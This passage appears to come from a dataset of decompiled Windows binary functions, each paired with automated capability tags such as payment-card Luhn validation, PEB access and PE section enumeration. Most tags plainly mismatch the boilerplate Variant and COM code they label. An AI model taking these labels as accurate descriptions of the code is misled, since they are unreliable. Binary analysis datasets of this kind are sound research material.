        "decompiled_code": "\nint32_t __fastcall fcn.0040e35c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 0xc) = 0xffff;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0xffffffff, 0xffffffff, 0);\n    *(in_EAX + 0x10) = uVar1;\n    uVar2 = 0;\n    uVar1 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n    *(in_EAX + 0x14) = uVar1;\n    *(in_EAX + 0x18) = 0xffffffff;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0x20) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 292
    },
    "0040e6fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e6fc(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x40e70b;\n    uStack24 = param_2;\n    sub.kernel32.dll_SetErrorMode();\n    uStack32 = 0x40e76e;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x40e750;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    uVar1 = fcn.00404a88();\n    sub.kernel32.dll_LoadLibraryA();\n    *in_FS_OFFSET = uVar1;\n    return;\n}\n",
        "token_count": 252
    },
    "0040fc88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fc88(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40fd17;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.004158fc();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.004158fc();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h, arg_ch);\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40fd1e;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 304
    },
    "0040fdcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040fdcc(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint *arg_ch;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x40fe5b;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.004158fc();\n    var_10h = 0;\n    var_ch._0_1_ = 0xb;\n    fcn.004158fc();\n    var_8h = 0;\n    var_4h._0_1_ = 0xb;\n    arg_ch = &var_10h;\n    arg_8h = 1;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h, arg_ch);\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h;\n    uStack52 = 0x40fe62;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 304
    },
    "0041023c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041023c(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 182
    },
    "0041026c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041026c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0041026c(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "004102c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004102c8(void)\n\n{\n    char cVar1;\n    uint16_t *in_EAX;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    uint plLbound;\n    uint ppvData;\n    uint var_310h;\n    int32_t plUbound;\n    uint16_t *psa;\n    uint pvarg;\n    uint var_300h;\n    uint var_2fch;\n    uint rgIndices;\n    \n    if ((*(in_EAX + 1) & 0x20) == 0) {\n        fcn.00410110();\n    }\n    if ((*in_EAX & 0xfff) == 0xc) {\n        if ((*in_EAX & 0x4000) == 0) {\n            psa = *(in_EAX + 4);\n        }\n        else {\n            psa = **(in_EAX + 4);\n        }\n        uVar2 = *psa;\n        if (-1 < uVar2 - 1) {\n            iVar7 = 0;\n            piVar6 = &var_300h;\n            uVar5 = uVar2;\n            do {\n                sub.oleaut32.dll_SafeArrayGetLBound(psa, iVar7 + 1, piVar6 + 1);\n                fcn.00410110();\n                sub.oleaut32.dll_SafeArrayGetUBound();\n                fcn.00410110();\n                *piVar6 = (plUbound - piVar6[1]) + 1;\n                iVar7 = iVar7 + 1;\n                piVar6 = piVar6 + 2;\n                uVar5 = uVar5 - 1;\n            } while (uVar5 != 0);\n        }\n        if (-1 < uVar2 - 1) {\n            puVar3 = &var_2fch;\n            puVar4 = &rgIndices;\n            do {\n                *puVar4 = *puVar3;\n                puVar4 = puVar4 + 1;\n                puVar3 = puVar3 + 2;\n                uVar2 = uVar2 - 1;\n            } while (uVar2 != 0);\n        }\n        do {\n            cVar1 = fcn.0041023c(&stack0xfffffffc);\n            if (cVar1 != '\\0') {\n                sub.oleaut32.dll_SafeArrayPtrOfIndex();\n                fcn.00410110();\n                fcn.004104c0();\n            }\n            cVar1 = fcn.0041026c(&stack0xfffffffc);\n        } while (cVar1 != '\\0');\n    }\n    sub.oleaut32.dll_VariantClear(in_EAX);\n    fcn.00410110();\n    return;\n}\n",
        "token_count": 631
    },
    "004104dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004104dc(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    \n    do {\n        uVar2 = *(arg_8h + -0x2fc + in_EAX * 8) + *(arg_8h + -0x300 + in_EAX * 8);\n        bVar1 = *(arg_8h + -0x100 + in_EAX * 4) < uVar2;\n        uVar2 = uVar2 & 0xffffff00 | bVar1;\n        in_EAX = in_EAX + -1;\n        if (!bVar1) {\n            return uVar2;\n        }\n    } while (-1 < in_EAX);\n    return uVar2;\n}\n",
        "token_count": 181
    },
    "0041050c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041050c(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    \n    uVar3 = 1;\n    piVar1 = arg_8h + -0x100 + in_EAX * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = *(arg_8h + -0x2fc + in_EAX * 8);\n    if (iVar2 + *(arg_8h + -0x300 + in_EAX * 8) <= *(arg_8h + -0x100 + in_EAX * 4)) {\n        if (in_EAX == 0) {\n            uVar3 = 0;\n        }\n        else {\n            *(arg_8h + -0x100 + in_EAX * 4) = iVar2;\n            uVar3 = fcn.0041050c(arg_8h);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 237
    },
    "00410ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00410ac0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    \n    puStack36 = &fcn.00410ac0::pvarg;\n    puStack40 = 0x410ad8;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x410b1c;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fcn.00410d48();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x410b23;\n    uStack44 = 0x410b1b;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 209
    },
    "00411028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00411028(void)\n\n{\n    uchar *puStack24;\n    uchar auStack20 [16];\n    \n    puStack24 = auStack20;\n    sub.oleaut32.dll_VariantInit();\n    (***0x484728)(&puStack24);\n    fcn.0041011c();\n    return 0x400;\n}\n",
        "token_count": 77
    },
    "00411064": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00411064(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_4h;\n    \n    puStack32 = &fcn.00411064::pvarg;\n    puStack36 = 0x411076;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4110b8;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    var_4h = fcn.0041110c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4110bf;\n    uStack40 = 0x4110b7;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 218
    },
    "004110c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.004110c8(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(3);\n        *param_2 = iStack28;\n    }\n    return uVar1;\n}\n",
        "token_count": 123
    },
    "00411b18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00411b18(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &fcn.00411b18::pvarg;\n    puStack40 = 0x411b2a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x411b6f;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    _var_8h = fcn.00411bd0();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x411b76;\n    uStack44 = 0x411b6e;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 240
    },
    "00411b84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00411b84(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(0x14);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 145
    },
    "0041211c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041211c(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    uint var_1h;\n    \n    puStack32 = &fcn.0041211c::pvarg;\n    puStack36 = 0x41212e;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x412170;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &fcn.0041211c::var_1h + 1;\n    fcn.004107fc();\n    (**0x485818)();\n    var_1h._0_1_ = fcn.004121cc();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x412177;\n    uStack40 = 0x41216f;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 257
    },
    "00412520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00412520(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_1ch;\n    uint var_18h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x4125d5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack48;\n    fcn.0041418c();\n    uVar3 = 0;\n    iVar2 = (***0x4845fc)(0, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.00404850();\n        cVar1 = fcn.0040a57c();\n        if (cVar1 == '\\0') {\n            fcn.0041011c();\n        }\n        else {\n            _var_8h = _var_18h;\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041011c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x4125dc);\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 322
    },
    "004125e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004125e4(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x484728)(auStack24);\n    fcn.0041011c();\n    return CONCAT44(auStack20, 5);\n}\n",
        "token_count": 75
    },
    "00412630": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412630(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00412630::pvarg;\n    puStack40 = 0x412642;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412685;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fVar1 = fcn.004126e0();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41268c;\n    uStack44 = 0x412684;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 228
    },
    "00412694": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412694(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(5);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 142
    },
    "00412a5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nunkbyte10 fcn.00412a5c(void)\n\n{\n    unkbyte10 Var1;\n    \n    Var1 = fcn.004126e0();\n    return Var1;\n}\n",
        "token_count": 41
    },
    "00412c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412c08(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x412ce4;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    fcn.0041418c();\n    uVar3 = 0;\n    iVar2 = (***0x4843f0)(0, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.00404850();\n        cVar1 = fcn.0040bf38();\n        if (cVar1 == '\\0') {\n            fcn.00404850();\n            cVar1 = fcn.0040a598();\n            if (cVar1 == '\\0') {\n                fcn.0041011c();\n            }\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041011c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045ec(0x412ceb);\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 347
    },
    "00412cf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.00412cf4(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x484728)(&pvarg, &pvarg, 0x400, 0, 7);\n    fcn.0041011c();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 158
    },
    "00412d54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.00412d54(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x484728)(auStack24);\n    fcn.0041011c();\n    return CONCAT44(auStack20, 7);\n}\n",
        "token_count": 75
    },
    "00412da0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00412da0(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    double dStack12;\n    \n    puStack36 = &fcn.00412da0::pvarg;\n    puStack40 = 0x412db2;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x412df5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fVar1 = fcn.00412e50();\n    dStack12 = fVar1;\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x412dfc;\n    uStack44 = 0x412df4;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 233
    },
    "00412e04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00412e04(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(7);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "004131a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004131a0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41324c;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    fcn.0041418c();\n    uVar3 = 0;\n    iVar2 = (***0x4847c4)(0, 0x400, 0, &var_8h);\n    if (iVar2 == -0x7ffdfffb) {\n        fcn.00404850();\n        cVar1 = fcn.0040a5f0();\n        if (cVar1 == '\\0') {\n            fcn.0041011c();\n        }\n    }\n    else if (iVar2 != 0) {\n        fcn.0041011c();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x413253);\n    fcn.00404cd4();\n    return;\n}\n",
        "token_count": 288
    },
    "0041325c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nfloat10 __cdecl fcn.0041325c(uint arg_8h, uint arg_ch)\n\n{\n    uint pvarg;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    sub.oleaut32.dll_VariantInit(&pvarg);\n    pvarg._0_2_ = 5;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    (***0x484728)(&pvarg, &pvarg, 0x400, 0, 6);\n    fcn.0041011c();\n    return CONCAT44(var_ch, var_10h);\n}\n",
        "token_count": 158
    },
    "004132bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nfloat10 fcn.004132bc(void)\n\n{\n    uchar auStack24 [4];\n    uchar auStack20 [16];\n    \n    sub.oleaut32.dll_VariantInit();\n    (***0x484728)(auStack24);\n    fcn.0041011c();\n    return CONCAT44(auStack20, 6);\n}\n",
        "token_count": 74
    },
    "00413308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413308(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint *puStack36;\n    uint pvarg;\n    int64_t iStack12;\n    \n    puStack36 = &fcn.00413308::pvarg;\n    puStack40 = 0x41331a;\n    sub.oleaut32.dll_VariantInit();\n    uStack44 = 0x41335d;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fVar1 = fcn.004133b8();\n    iStack12 = ROUND(fVar1);\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x413364;\n    uStack44 = 0x41335c;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 233
    },
    "0041336c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.0041336c(uint param_1, int32_t *param_2)\n\n{\n    uint uVar1;\n    int32_t iStack28;\n    int32_t iStack24;\n    \n    uVar1 = fcn.00417654();\n    if (uVar1 != '\\0') {\n        sub.oleaut32.dll_VariantInit();\n        (**(iStack28 + 0x1c))(6);\n        *param_2 = iStack28;\n        param_2[1] = iStack24;\n    }\n    return uVar1;\n}\n",
        "token_count": 143
    },
    "004138b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004138b8(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint *puStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint pvarg;\n    uint var_8h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_14h = 0;\n    uStack44 = 0x413977;\n    iStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = &fcn.004138b8::pvarg;\n    puStack56 = 0x4138e3;\n    sub.oleaut32.dll_VariantInit();\n    uStack60 = 0x413955;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    (***0x484728)(&fcn.004138b8::pvarg);\n    fcn.0041011c();\n    arg_8h = &fcn.004138b8::var_14h;\n    fcn.00404de4();\n    fcn.00404ed0(arg_8h);\n    fcn.00404850();\n    *in_FS_OFFSET = arg_8h;\n    fcn.004104c0(0x41395c);\n    return;\n}\n",
        "token_count": 351
    },
    "00413984": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00413984(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint *puStack32;\n    uint pvarg;\n    \n    puStack32 = &fcn.00413984::pvarg;\n    puStack36 = 0x413999;\n    sub.oleaut32.dll_VariantInit();\n    uStack40 = 0x4139da;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    fcn.004107fc();\n    (**0x485818)();\n    fcn.00413a6c();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x4139e1;\n    uStack40 = 0x4139d9;\n    fcn.004104c0();\n    return;\n}\n",
        "token_count": 207
    },
    "00413fa8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
